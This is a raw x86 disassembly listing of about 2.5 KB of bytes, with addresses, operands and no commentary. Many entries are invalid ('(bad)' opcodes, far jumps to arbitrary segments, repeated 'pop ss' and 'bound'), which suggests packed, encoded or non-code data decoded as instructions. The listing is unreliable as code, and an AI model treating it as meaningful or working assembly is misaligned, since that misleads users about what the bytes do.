  4337f0:	bound  esp,QWORD PTR [edx-0x10]
  4337f3:	fldenv [ecx+0x61]
  4337f6:	popa   
  4337f7:	(bad)  
  4337f8:	jmp    0xb269:0x1e220fb
  4337ff:	jg     0x43387b
  433801:	sub    edx,esp
  433803:	add    DWORD PTR [ecx+0x62],ebp
  433806:	mov    dl,0x76
  433808:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  43380e:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  433814:	bound  esi,QWORD PTR [edx+0x6367f39a]
  43381a:	bound  esp,QWORD PTR [edx+0xd]
  43381d:	int    0x7e
  43381f:	pop    ss
  433820:	push   0xead6a4ee
  433825:	sti    
  433826:	sub    edx,esp
  433828:	add    DWORD PTR [ecx-0x4e],ebp
  43382b:	jg     0x4338a7
  43382d:	push   ds
  43382e:	loop   0x433831
  433830:	imul   esp,DWORD PTR [edx-0x4e],0x8ab26276
  433837:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  43383d:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  433843:	repz push edx
  433845:	arpl   WORD PTR [edx+0x62],sp
  433848:	or     eax,0x68177ecd
  43384d:	out    dx,al
  43384e:	cs (bad) 
  433850:	jmp    0xb269:0x1e21efb
  433857:	jns    0x4338d3
  433859:	daa    
  43385a:	loop   0x43385d
  43385c:	imul   esp,DWORD PTR [edx-0x4e],0x8ab26276
  433863:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  433869:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  43386f:	repz add esp,DWORD PTR [ebx+0x62]
  433873:	bound  ecx,QWORD PTR ds:0x68177ecd
  433879:	or     eax,0x610d7e75
  43387e:	mov    ebp,0xa5617622
  433883:	or     eax,0x13c9c964
  433888:	jne    0x4338df
  43388a:	pop    ss
  43388b:	jne    0x4338f6
  43388d:	or     eax,0x61216975
  433892:	push   edx
  433893:	ds dec eax
  433895:	cmp    dl,dh
  433897:	jmp    0xb23a:0x483e5255
  43389e:	cmp    cl,BYTE PTR ds:0xa2ff9275
  4338a4:	cmp    bh,ch
  4338a6:	or     eax,0xa2ff9275
  4338ab:	push   0x86750d36
  4338b0:	jmp    DWORD PTR [edx+0x22575991]
  4338b6:	xchg   BYTE PTR [ecx-0x5b],ah
  4338b9:	or     eax,0x21c9c964
  4338be:	jne    0x433929
  4338c0:	lods   eax,DWORD PTR ds:[esi]
  4338c1:	pop    ebx
  4338c2:	add    DWORD PTR [ecx+0xd],ebp
  4338c5:	jne    0x43384d
  4338c7:	or     eax,0x6168e9db
  4338cc:	popa   
  4338cd:	or     eax,0x910d9acd
  4338d2:	pop    ss
  4338d3:	call   0xe9db:0xd86750d
  4338da:	push   0xcd0d6161
  4338df:	xchg   BYTE PTR ds:0x61680c17,cl
  4338e5:	popa   
  4338e6:	or     eax,0xd681761
  4338eb:	jne    0x433873
  4338ed:	or     eax,0x6168e9db
  4338f2:	popa   
  4338f3:	or     eax,0x170d86cd
  4338f8:	jmp    0xda49a65
  4338fd:	xchg   ecx,eax
  4338fe:	or     eax,0x96995661
  433903:	pop    ss
  433904:	jne    0x43395b
  433906:	or     eax,0xf2935575
  43390b:	mov    ds:0x69cd0d6a,al
  433910:	(bad)  
  433911:	outs   dx,DWORD PTR ds:[esi]
  433912:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433918:	pop    esi
  433919:	call   0x1fc29ac6
  43391e:	out    0x93,eax
  433920:	or     eax,0xdb0d8675
  433925:	pusha  
  433926:	push   0x61216161
  43392b:	and    eax,0x576901e2
  433930:	and    bl,BYTE PTR [edx+0x640da561]
  433936:	fsub   DWORD PTR [esi+edx*4+0x21]
  43393a:	jne    0x4339a5
  43393c:	lods   eax,DWORD PTR ds:[esi]
  43393d:	or     eax,DWORD PTR [ecx]
  43393f:	imul   esp,DWORD PTR [ecx],0xe2315575
  433945:	add    DWORD PTR [ecx+0x21],ebp
  433948:	jne    0x433992
  43394a:	and    dl,ah
  43394c:	add    DWORD PTR [ecx+0x21],ebp
  43394f:	jne    0x433982
  433951:	mov    bl,0xe2
  433953:	add    DWORD PTR [ecx+0x21],ebp
  433956:	jne    0x4339b5
  433958:	lods   eax,DWORD PTR ds:[esi]
  433959:	xor    al,0x9
  43395b:	imul   edx,DWORD PTR [ebx],0x7517f775
  433961:	cmp    al,0xd
  433963:	jne    0x4338f3
  433965:	or     eax,0x6168e9db
  43396a:	popa   
  43396b:	pop    ss
  43396c:	jne    0x433986
  43396e:	or     eax,0xdb0d8e75
  433973:	or     al,0x68
  433975:	popa   
  433976:	popa   
  433977:	pop    ss
  433978:	jne    0x4339ca
  43397a:	or     eax,0xdb0d8e75
  43397f:	adc    BYTE PTR [eax+0x61],ch
  433982:	popa   
  433983:	pop    ss
  433984:	jne    0x433979
  433986:	or     eax,0x610df375
  43398b:	or     eax,0x6fd686cd
  433990:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433996:	pop    esi
  433997:	call   0x1fea9b44
  43399c:	mov    dl,0x97
  43399e:	bound  esi,QWORD PTR [edx-0x44d9d72]
  4339a4:	repz xchg ebx,eax
  4339a6:	bound  esp,QWORD PTR [edx+0x62]
  4339a9:	or     eax,0x610d5075
  4339ae:	or     eax,0x910d50cd
  4339b3:	push   esi
  4339b4:	cdq    
  4339b5:	xchg   esi,eax
  4339b6:	pop    ss
  4339b7:	jne    0x433a1d
  4339b9:	or     eax,0xb858675
  4339be:	call   0xa8e8:0x5e343ac9
  4339c5:	popa   
  4339c6:	or     eax,0x68a7f3cd
  4339cb:	xchg   ebx,eax
  4339cc:	loop   0x433a1d
  4339ce:	popa   
  4339cf:	popa   
  4339d0:	popa   
  4339d1:	or     eax,0x610d1875
  4339d6:	pop    ss
  4339d7:	jne    0x433a31
  4339d9:	adc    esi,DWORD PTR [ebp+0x28]
  4339dc:	shl    BYTE PTR [edx-0x4e],cl
  4339df:	pop    eax
  4339e0:	bound  esi,QWORD PTR [edx+0x50b262f3]
  4339e6:	bound  esi,QWORD PTR [edx-0x714d9de8]
  4339ec:	bound  esi,QWORD PTR [edx+0x55b26292]
  4339f2:	bound  esi,QWORD PTR [edx+0x69b26231]
  4339f8:	adc    esi,DWORD PTR [ebp+0x64]
  4339fb:	rcl    BYTE PTR [ebx],cl
  4339fd:	jne    0x433a4b
  4339ff:	shl    BYTE PTR [edx-0x4e],cl
  433a02:	call   0x76b2:0x6286b262
  433a09:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  433a0f:	repz (bad) 
  433a11:	pop    ebp
  433a12:	bound  esp,QWORD PTR [edx+0x17]
  433a15:	jne    0x433a77
  433a17:	bound  esi,QWORD PTR [edx-0x754d9d8a]
  433a1d:	bound  esi,QWORD PTR [edx+0x60750d28]
  433a23:	bound  ebx,QWORD PTR [eax+0x13]
  433a26:	jne    0x433a1f
  433a28:	pop    ss
  433a29:	jne    0x433a67
  433a2b:	or     eax,0x75568e75
  433a30:	dec    esp
  433a31:	pop    ss
  433a32:	jne    0x4339c2
  433a34:	or     eax,0xdb0d8e75
  433a39:	jmp    0x17a49ba6
  433a3e:	jne    0x433a58
  433a40:	or     eax,0xdb0d8e75
  433a45:	or     al,0x68
  433a47:	popa   
  433a48:	popa   
  433a49:	pop    ss
  433a4a:	jne    0x433a9c
  433a4c:	or     eax,0xdb0d8e75
  433a51:	adc    BYTE PTR [eax+0x61],ch
  433a54:	popa   
  433a55:	pop    ss
  433a56:	jne    0x433a4b
  433a58:	or     eax,0x610df375
  433a5d:	or     eax,0x68a13ccd
  433a62:	call   0xf3b84808
  433a67:	or     eax,0x50cd0d61
  433a6c:	or     eax,0x50a50d91
  433a71:	or     eax,0x96c80d88
  433a76:	push   esi
  433a77:	sub    al,0x89
  433a79:	ror    BYTE PTR ds:0x68a13ccd,cl
  433a7f:	jae    0x433af7
  433a81:	or     eax,0x75173c75
  433a86:	stc    
  433a87:	or     eax,0x610d5075
  433a8c:	or     eax,0x910df3cd
  433a91:	sub    eax,0xf9cd0d1f
  433a96:	push   esi
  433a97:	push   0x17f9cd0d
  433a9c:	push   0xee4c750d
  433aa1:	lea    ecx,ds:0xb858675
  433aa7:	call   0xa8e8:0x5e343ac9
  433aae:	popa   
  433aaf:	push   edi
  433ab0:	and    bh,bl
  433ab2:	popa   
  433ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433ab4:	or     eax,0xa264d864
  433ab9:	or     eax,0x75179275
  433abe:	dec    eax
  433abf:	or     eax,0xdb0d4875
  433ac4:	or     al,0x68
  433ac6:	popa   
  433ac7:	popa   
  433ac8:	fsubr  DWORD PTR [edx-0x2779189f]
  433ace:	jmp    0xead8:0x3be7619a
  433ad5:	xchg   BYTE PTR [ecx-0x4e],ah
  433ad8:	cmp    ch,BYTE PTR [edi+0x68f4f01c]
  433ade:	popa   
  433adf:	popa   
  433ae0:	or     eax,0xdb0d4875
  433ae5:	or     al,0x68
  433ae7:	popa   
  433ae8:	popa   
  433ae9:	or     eax,0x170d48cd
  433aee:	or     al,0x68
  433af0:	popa   
  433af1:	popa   
  433af2:	or     eax,0x56610d91
  433af7:	cdq    
  433af8:	xchg   esi,eax
  433af9:	pop    ss
  433afa:	jne    0x433b14
  433afc:	or     eax,0x14d88675
  433b01:	add    al,0x61
  433b03:	popa   
  433b04:	popa   
  433b05:	popa   
  433b06:	out    0x8b,eax
  433b08:	or     eax,0x14d88675
  433b0d:	adc    BYTE PTR [ecx+0x61],ah
  433b10:	popa   
  433b11:	xchg   edx,eax
  433b12:	out    0x97,eax
  433b14:	or     eax,0xa20d8675
  433b19:	sahf   
  433b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433b1b:	jne    0x433ab7
  433b1d:	mov    dl,0x9a
  433b1f:	scas   eax,DWORD PTR es:[edi]
  433b20:	sbb    al,0xa2
  433b22:	lock (bad) [eax+0x61]
  433b26:	popa   
  433b27:	fcom   DWORD PTR [ebp-0x6a279e0d]
  433b2d:	dec    esp
  433b2e:	popa   
  433b2f:	fcom   DWORD PTR [ebp-0x6a279e9c]
  433b35:	push   eax
  433b36:	popa   
  433b37:	fcom   DWORD PTR [ebp-0x6a279ed8]
  433b3d:	pop    eax
  433b3e:	popa   
  433b3f:	fcom   DWORD PTR [ebp-0x6a279ec4]
  433b45:	pop    ebp
  433b46:	popa   
  433b47:	fcom   DWORD PTR [ebp+0x750d6131]
  433b4d:	dec    eax
  433b4e:	or     eax,0x616810db
  433b53:	popa   
  433b54:	or     eax,0x9a2d9acd
  433b59:	pop    ss
  433b5a:	int    0x55
  433b5c:	or     eax,0x4348675
  433b61:	popa   
  433b62:	popa   
  433b63:	popa   
  433b64:	pop    ss
  433b65:	jne    0x433b5a
  433b67:	or     eax,0xcd0df375
  433b6c:	call   0xd4c:0xcd179a56
  433b73:	jne    0x433bc1
  433b75:	pop    ss
  433b76:	jne    0x433bd5
  433b78:	or     eax,0x1cd85d75
  433b7d:	xchg   edx,eax
  433b7e:	pop    ss
  433b7f:	jne    0x433ba9
  433b81:	fcom   DWORD PTR [ebp-0x6d119ea0]
  433b87:	or     eax,0x17a26075
  433b8c:	jne    0x433bee
  433b8e:	or     eax,0x1cd82875
  433b93:	call   0x4c75:0xd287517
  433b9a:	xchg   ebx,eax
  433b9b:	repnz mov ds:0x4ccd0d8c,al
  433ba1:	xchg   ebx,eax
  433ba2:	repnz rol DWORD PTR [esi+0x75a11f56],1
  433ba9:	pusha  
  433baa:	xchg   ebx,eax
  433bab:	fsub   DWORD PTR [esi+0x61]
  433bae:	popa   
  433baf:	popa   
  433bb0:	or     eax,0xa20d2875
  433bb5:	not    ebp
  433bb7:	bound  esp,QWORD PTR [edx+0x62]
  433bba:	fdiv   QWORD PTR [edx+0xd60ee5f]
  433bc0:	jne    0x433bea
  433bc2:	or     eax,0x62d5f7a2
  433bc7:	bound  esp,QWORD PTR [edx-0x24]
  433bca:	push   esi
  433bcb:	jne    0x433c2a
  433bcd:	pop    ss
  433bce:	jne    0x433c34
  433bd0:	or     eax,0xa20d2875
  433bd5:	not    ebp
  433bd7:	bound  esp,QWORD PTR [edx+0x62]
  433bda:	fmul   QWORD PTR ds:0x2c135dcd
  433be0:	push   0x58751792
  433be5:	fcom   DWORD PTR [ebp-0x6d119e07]
  433beb:	or     eax,0x17a2f975
  433bf0:	jne    0x433beb
  433bf2:	or     eax,0x1cd85875
  433bf7:	call   0x6475:0xd587517
  433bfe:	xchg   ebx,eax
  433bff:	repnz mov ds:0x64cd0d8c,al
  433c05:	xchg   ebx,eax
  433c06:	repnz rol DWORD PTR [esi+0x75a11f56],1
  433c0d:	stc    
  433c0e:	xchg   ebx,eax
  433c0f:	fcom   DWORD PTR [edi]
  433c11:	popa   
  433c12:	popa   
  433c13:	popa   
  433c14:	or     eax,0xa20d5875
  433c19:	not    ebp
  433c1b:	bound  esp,QWORD PTR [edx+0x62]
  433c1e:	fdiv   QWORD PTR [edx+0xd60ee5f]
  433c24:	jne    0x433c7e
  433c26:	or     eax,0x62d5f7a2
  433c2b:	bound  esp,QWORD PTR [edx-0x24]
  433c2e:	push   esi
  433c2f:	jne    0x433c8e
  433c31:	pop    ss
  433c32:	jne    0x433c84
  433c34:	or     eax,0xa20d5875
  433c39:	not    ebp
  433c3b:	bound  esp,QWORD PTR [edx+0x62]
  433c3e:	fmul   QWORD PTR ds:0x2c135dcd
  433c44:	push   0x3c751792
  433c49:	fcom   DWORD PTR [ebp-0x6d119ee4]
  433c4f:	or     eax,0x17a21c75
  433c54:	jne    0x433c72
  433c56:	or     eax,0x1cd83c75
  433c5b:	call   0x5075:0xd3c7517
  433c62:	xchg   ebx,eax
  433c63:	repnz mov ds:0x50cd0d8c,al
  433c69:	xchg   ebx,eax
  433c6a:	repnz rol DWORD PTR [esi+0x75a11f56],1
  433c71:	sbb    al,0x73
  433c73:	mov    cs,WORD PTR ds:0xe3d83c75
  433c79:	mul    DWORD PTR [ecx-0x19]
  433c7c:	or     DWORD PTR ds:0xcd0d3c75,0xf7da565d
  433c86:	pop    ss
  433c87:	int    0x69
  433c89:	or     eax,0x610d6975
  433c8e:	push   esi
  433c8f:	jne    0x433ce6
  433c91:	or     eax,0x681769cd
  433c96:	out    dx,al
  433c97:	repnz lock int3 
  433c9a:	bound  esp,QWORD PTR [edx+0x62]
  433c9d:	lock sbb esp,DWORD PTR [ebx+0x62]
  433ca1:	bound  ebp,QWORD PTR [edi+0x2257a21c]
  433ca7:	xchg   BYTE PTR [ecx-0x5b],ah
  433caa:	or     eax,0x2c64d864
  433caf:	or     eax,0x75179275
  433cb4:	cmp    al,0xd
  433cb6:	jne    0x433cf4
  433cb8:	or     eax,0x61680cdb
  433cbd:	popa   
  433cbe:	fsubr  DWORD PTR [edx-0x27c4189f]
  433cc4:	jmp    0x1caf:0x3ab26186
  433ccb:	lock leave 
  433ccd:	push   0x750d6161
  433cd2:	cmp    al,0xd
  433cd4:	fisttp DWORD PTR [eax+ebp*2]
  433cd7:	popa   
  433cd8:	popa   
  433cd9:	or     eax,0x170d3ccd
  433cde:	or     al,0x68
  433ce0:	popa   
  433ce1:	popa   
  433ce2:	or     eax,0x56610d91
  433ce7:	cdq    
  433ce8:	xchg   esi,eax
  433ce9:	pop    ss
  433cea:	jne    0x433d34
  433cec:	or     eax,0xe3d88675
  433cf1:	jecxz  0x433d54
  433cf3:	mov    dl,0x9a
  433cf5:	scas   eax,DWORD PTR es:[edi]
  433cf6:	sbb    al,0xa2
  433cf8:	lock mov gs,WORD PTR [eax+0x61]
  433cfc:	popa   
  433cfd:	or     eax,0x1cd88675
  433d02:	jecxz  0x433d1b
  433d04:	jne    0x433d37
  433d06:	or     eax,0xcd0d3175
  433d0b:	call   0xdf9:0xcd179a56
  433d12:	jne    0x433d0d
  433d14:	or     eax,0x751792a2
  433d19:	sbb    BYTE PTR ds:0xcd0df975,cl
  433d1f:	call   0x5dcd:0x1776da56
  433d26:	or     eax,0xcd0df975
  433d2b:	call   0x60cd:0x17fbda56
  433d32:	or     eax,0xcd0df975
  433d37:	call   0xf3cd:0x178eda56
  433d3e:	fcom   DWORD PTR [ebp-0x6a279eb0]
  433d44:	dec    esp
  433d45:	popa   
  433d46:	or     eax,0xcd0df975
  433d4b:	stc    
  433d4c:	or     eax,0x99a77ea2
  433d51:	mov    al,ch
  433d53:	xchg   edi,eax
  433d54:	or     eax,0xa20df975
  433d59:	jle    0x433d72
  433d5b:	jne    0x433d7d
  433d5d:	out    dx,al
  433d5e:	xchg   ecx,eax
  433d5f:	or     eax,0xa20df975
  433d64:	mov    dl,BYTE PTR [edi]
  433d66:	jne    0x433d88
  433d68:	or     eax,0x75172075
  433d6d:	pop    eax
  433d6e:	fcom   DWORD PTR [ebp+0x3aee611c]
  433d74:	or     eax,0x17a21c75
  433d79:	jne    0x433d97
  433d7b:	or     eax,0x75a71c75
  433d80:	pop    eax
  433d81:	xchg   ebx,eax
  433d82:	fcom   DWORD PTR [ecx]
  433d84:	popa   
  433d85:	popa   
  433d86:	popa   
  433d87:	or     eax,0xcd0df975
  433d8c:	sbb    al,0xa7
  433d8e:	fidivr DWORD PTR [esi+0x73]
  433d91:	jl     0x433da0
  433d93:	jne    0x433db1
  433d95:	or     eax,0xa50d60cd
  433d9a:	call   0x64a5:0x17d67e56
  433da1:	or     eax,0xcd0d1c75
  433da6:	repz xchg ebx,eax
  433da8:	repnz neg DWORD PTR [ecx-0x11d78ae9]
  433daf:	cmp    ecx,DWORD PTR ds:0x75171c75
  433db5:	sub    BYTE PTR ds:0xcd0d2875,cl
  433dbb:	pop    ebp
  433dbc:	fcom   DWORD PTR [esi+0x5fb261d6]
  433dc2:	out    dx,al
  433dc3:	lods   eax,DWORD PTR ds:[esi]
  433dc4:	or     eax,0xcd0d2875
  433dc9:	pop    ebp
  433dca:	or     eax,0x7e569aa5
  433dcf:	(bad)  
  433dd0:	pop    ss
  433dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433dd2:	imul   ecx,DWORD PTR ds:0x75562875,0x55751718
  433ddc:	or     eax,0x75a76975
  433de1:	stc    
  433de2:	lds    esi,FWORD PTR [esi+0xd]
  433de5:	jne    0x433e18
  433de7:	or     eax,0xda56f9cd
  433dec:	mul    DWORD PTR [ecx-0x738c9633]
  433df2:	or     eax,0xcd0d2875
  433df7:	pop    ebp
  433df8:	or     eax,0x7517d6f7
  433dfd:	imul   ebp,esi,0x69750d93
  433e03:	sub    eax,0xcd0d9a75
  433e08:	sub    BYTE PTR ds:0xf7175da5,cl
  433e0e:	sbb    bl,al
  433e10:	jmp    0x1caf:0xf7b26169
  433e17:	out    dx,al
  433e18:	call   0xaf62:0x6262a4f0
  433e1f:	sbb    al,0xa2
  433e21:	push   edi
  433e22:	and    al,BYTE PTR [esi+0x640da561]
  433e28:	fsub   DWORD PTR [esi+esi*4+0x21]
  433e2c:	jne    0x433e6a
  433e2e:	lods   eax,DWORD PTR ds:[esi]
  433e2f:	loop   0x433e32
  433e31:	imul   esp,DWORD PTR [ecx],0xe2252875
  433e37:	add    DWORD PTR [ecx+0xd],ebp
  433e3a:	jne    0x433dce
  433e3c:	pop    ss
  433e3d:	jne    0x433e57
  433e3f:	or     eax,0xb853c75
  433e44:	call   0xa8e8:0x5e343ac9
  433e4b:	popa   
  433e4c:	pop    ss
  433e4d:	jne    0x433eb3
  433e4f:	and    DWORD PTR [ebp+0x5d],esi
  433e52:	push   edx
  433e53:	out    dx,al
  433e54:	enter  0xd56,0x75
  433e58:	cmp    al,0x85
  433e5a:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433e60:	call   0x755aa00d
  433e65:	repz or eax,0xb853c75
  433e6b:	call   0xa8e8:0x5e343ac9
  433e72:	popa   
  433e73:	pop    ss
  433e74:	jne    0x433ea7
  433e76:	or     eax,0xb853c75
  433e7b:	call   0xa8e8:0x5e343ac9
  433e82:	popa   
  433e83:	pop    ss
  433e84:	jne    0x433ed6
  433e86:	or     eax,0xb853c75
  433e8b:	call   0xa8e8:0x5e343ac9
  433e92:	popa   
  433e93:	pop    ss
  433e94:	jne    0x433eff
  433e96:	or     eax,0xb853c75
  433e9b:	call   0xa8e8:0x5e343ac9
  433ea2:	popa   
  433ea3:	pop    ss
  433ea4:	jne    0x433efb
  433ea6:	and    DWORD PTR [ebp+0x48],esi
  433ea9:	push   edx
  433eaa:	out    dx,al
  433eab:	enter  0xd56,0x75
  433eaf:	cmp    al,0x85
  433eb1:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433eb7:	call   0xcd50a064
  433ebc:	sbb    BYTE PTR ds:0x61680c17,cl
  433ec2:	popa   
  433ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433ec4:	push   0x750d7be7
  433ec9:	cmp    al,0x85
  433ecb:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433ed1:	call   0x75eaa07e
  433ed6:	xchg   bh,ah
  433ed8:	ror    DWORD PTR ds:0xdb0d1875,0xc
  433edf:	push   0xcd0d6161
  433ee4:	sbb    BYTE PTR ds:0x61680c17,cl
  433eea:	popa   
  433eeb:	or     eax,0x56610d91
  433ef0:	cdq    
  433ef1:	xchg   esi,eax
  433ef2:	pop    ss
  433ef3:	jne    0x433f4d
  433ef5:	or     eax,0xb853c75
  433efa:	call   0xa8e8:0x5e343ac9
  433f01:	popa   
  433f02:	or     eax,0xd6a186cd
  433f07:	(bad)  [ecx+0x61]
  433f0a:	popa   
  433f0b:	out    0x89,eax
  433f0d:	or     eax,0xcd0d8675
  433f12:	call   0x6161:0x61db0456
  433f19:	pop    ss
  433f1a:	int    0x5d
  433f1c:	out    dx,al
  433f1d:	mov    BYTE PTR ds:0xb852875,cl
  433f23:	call   0xa8e8:0x5e343ac9
  433f2a:	popa   
  433f2b:	lock adc edx,DWORD PTR [esi+0x61]
  433f2f:	popa   
  433f30:	out    dx,al
  433f31:	mov    BYTE PTR ds:0xb853c75,cl
  433f37:	call   0xa8e8:0x5e343ac9
  433f3e:	popa   
  433f3f:	lock ficom WORD PTR [esi+0x61]
  433f43:	popa   
  433f44:	and    DWORD PTR [ebp+0x4c],esi
  433f47:	lods   eax,DWORD PTR ds:[esi]
  433f48:	loop   0x433f4b
  433f4a:	imul   ebp,esi,0x48750d92
  433f50:	xor    esp,DWORD PTR [edi-0x18]
  433f53:	test   al,0x61
  433f55:	test   DWORD PTR [ebx],ecx
  433f57:	call   0xd4c:0x75173ac9
  433f5e:	jne    0x433fac
  433f60:	test   DWORD PTR [ebx],ecx
  433f62:	call   0xa8e8:0x5e343ac9
  433f69:	popa   
  433f6a:	pop    ss
  433f6b:	jne    0x433fb5
  433f6d:	or     eax,0x75a74875
  433f72:	dec    esp
  433f73:	out    0x7d,eax
  433f75:	or     eax,0x1c7b4875
  433f7a:	jle    0x433f89
  433f7c:	int    0x3c
  433f7e:	(bad)  
  433f7f:	outs   dx,DWORD PTR ds:[esi]
  433f80:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433f86:	pop    esi
  433f87:	call   0xa550a134
  433f8c:	pop    ebp
  433f8d:	mov    eax,ds:0x78b25f86
  433f92:	or     eax,0x1c7b4875
  433f97:	jle    0x433fa6
  433f99:	int    0x3c
  433f9b:	(bad)  
  433f9c:	outs   dx,DWORD PTR ds:[esi]
  433f9d:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433fa3:	pop    esi
  433fa4:	call   0xa550a151
  433fa9:	pop    ebp
  433faa:	mov    eax,ds:0x93925fc6
  433faf:	outs   dx,BYTE PTR ds:[esi]
  433fb0:	inc    esi
  433fb1:	pop    edi
  433fb2:	popa   
  433fb3:	popa   
  433fb4:	or     eax,0xb853c75
  433fb9:	call   0xa8e8:0x5e343ac9
  433fc0:	popa   
  433fc1:	pop    ss
  433fc2:	jne    0x43402d
  433fc4:	or     eax,0xb853c75
  433fc9:	call   0xa8e8:0x5e343ac9
  433fd0:	popa   
  433fd1:	pop    ss
  433fd2:	jne    0x434029
  433fd4:	or     eax,0x1c7b4875
  433fd9:	jle    0x434031
  433fdb:	jne    0x43403a
  433fdd:	pop    ss
  433fde:	jne    0x433fd9
  433fe0:	or     eax,0xcd0df975
  433fe5:	call   0x31cd:0x1792da56
  433fec:	or     eax,0xb853c75
  433ff1:	call   0xa8e8:0x5e343ac9
  433ff8:	popa   
  433ff9:	pop    ss
  433ffa:	jne    0x433fef
  433ffc:	or     eax,0xb853c75
  434001:	call   0xa8e8:0x5e343ac9
  434008:	popa   
  434009:	or     eax,0x68a1f9cd
  43400e:	out    0x97,eax
  434010:	or     eax,0xcd0df975
  434015:	call   0xdf3:0xcd179a56
  43401c:	jne    0x43405a
  43401e:	test   DWORD PTR [ebx],ecx
  434020:	call   0xdf9:0xcd0d3ac9
  434027:	rol    DWORD PTR [esi+0x5e9a6e13],1
  43402d:	call   0x7599a1da
  434032:	call   0x1c75:0x13507517
  434039:	pop    ss
  43403a:	jne    0x43409c
  43403c:	or     eax,0x61216075
  434041:	sub    edx,esp
  434043:	add    DWORD PTR [ecx+0x62],ebp
  434046:	mov    dl,0x50
  434048:	or     eax,0xdb0d1875
  43404d:	dec    eax
  43404e:	push   0x92626161
  434053:	pop    ss
  434054:	jne    0x4340bf
  434056:	or     eax,0xb853c75
  43405b:	call   0xa8e8:0x5e343ac9
  434062:	popa   
  434063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434064:	jne    0x4340cf
  434066:	mov    dl,0x88
  434068:	bound  esi,QWORD PTR [edx+0x18750d50]
  43406e:	or     eax,0x616848db
  434073:	popa   
  434074:	(bad)
  434079:	imul   esp,DWORD PTR [ecx],0x874d1475
  43407f:	xchg   esp,eax
  434080:	fcom   QWORD PTR [ebx]
  434082:	jne    0x434098
  434084:	pop    ss
  434085:	jne    0x4340a7
  434087:	or     eax,0x61212075
  43408c:	(bad)  
  43408d:	cmc    
  43408e:	add    DWORD PTR [ecx+0xd],ebp
  434091:	jne    0x4340cf
  434093:	test   DWORD PTR [ebx],ecx
  434095:	call   0xa8e8:0x5e343ac9
  43409c:	popa   
  43409d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43409e:	jne    0x434109
  4340a0:	mov    dl,0xaf
  4340a2:	or     eax,0xb852875
  4340a7:	call   0x1355:0xcd0d3ac9
  4340ae:	outs   dx,BYTE PTR ds:[esi]
  4340af:	push   0x61a8e85e
  4340b4:	pop    ss
  4340b5:	jne    0x43410c
  4340b7:	or     eax,0xb851475
  4340bc:	call   0xa8e8:0x5e343ac9
  4340c3:	popa   
  4340c4:	xchg   ebx,eax
  4340c5:	mov    edx,0xdd25575
  4340ca:	jne    0x4340e4
  4340cc:	or     eax,0x616848db
  4340d1:	popa   
  4340d2:	(bad)
  4340d7:	cmp    al,0x85
  4340d9:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4340df:	call   0x75eaa28c
  4340e4:	imul   esi,DWORD PTR [edx+0x1c750d6a],0xc99a0b85
  4340ee:	cmp    dh,BYTE PTR [esi+ebx*2]
  4340f1:	call   0x75e4a29e
  4340f6:	push   ebp
  4340f7:	xchg   ebx,eax
  4340f8:	mov    ch,0xda
  4340fa:	bound  esp,QWORD PTR [edx+0x62]
  4340fd:	or     eax,0xb853c75
  434102:	call   0xa8e8:0x5e343ac9
  434109:	popa   
  43410a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43410b:	jne    0x434176
  43410d:	mov    dl,0x80
  43410f:	or     eax,0xb852875
  434114:	call   0x1364:0xcd0d3ac9
  43411b:	outs   dx,BYTE PTR ds:[esi]
  43411c:	push   0x61a8e85e
  434121:	pop    ss
  434122:	jne    0x434188
  434124:	lock retf 0x6168
  434128:	popa   
  434129:	and    DWORD PTR [ebp+0x8],esi
  43412c:	pusha  
  43412d:	xchg   DWORD PTR [eax-0x528ade98],ecx
  434133:	push   edx
  434134:	xor    esi,edi
  434136:	mov    WORD PTR ds:0xb853c75,cs
  43413c:	call   0xa8e8:0x5e343ac9
  434143:	popa   
  434144:	pop    ss
  434145:	jne    0x4340f8
  434147:	out    dx,al
  434148:	imul   ecx,DWORD PTR ds:0xb852875,0xffffff9a
  43414f:	leave  
  434150:	cmp    cl,BYTE PTR ds:0x6e13b1cd
  434156:	push   0x61a8e85e
  43415b:	pop    ss
  43415c:	jne    0x43410f
  43415e:	or     eax,0xb853c75
  434163:	call   0xa8e8:0x5e343ac9
  43416a:	popa   
  43416b:	or     eax,0xa50db1cd
  434170:	xor    DWORD PTR [ecx+0x6e931af7],esp
  434176:	cmp    ch,BYTE PTR [eax+0x61]
  434179:	popa   
  43417a:	or     eax,0xb853c75
  43417f:	call   0xa8e8:0x5e343ac9
  434186:	popa   
  434187:	pop    ss
  434188:	jne    0x434192
  43418a:	or     eax,0xb853c75
  43418f:	call   0xa8e8:0x5e343ac9
  434196:	popa   
  434197:	pop    ss
  434198:	jne    0x434147
  43419a:	or     eax,0xb853c75
  43419f:	call   0xa8e8:0x5e343ac9
  4341a6:	popa   
  4341a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341a8:	jne    0x43419d
  4341aa:	out    0x86,eax
  4341ac:	or     eax,0xcd0db175
  4341b1:	repz or eax,0x7517d6f7
  4341b7:	or     BYTE PTR ds:0xcd0db175,cl
  4341bd:	xor    DWORD PTR ds:0x7517d6f7,ecx
  4341c3:	lods   eax,DWORD PTR ds:[esi]
  4341c4:	or     eax,0xb853c75
  4341c9:	call   0xa8e8:0x5e343ac9
  4341d0:	popa   
  4341d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341d2:	jne    0x4341dc
  4341d4:	out    0xa2,eax
  4341d6:	or     eax,0xb853c75
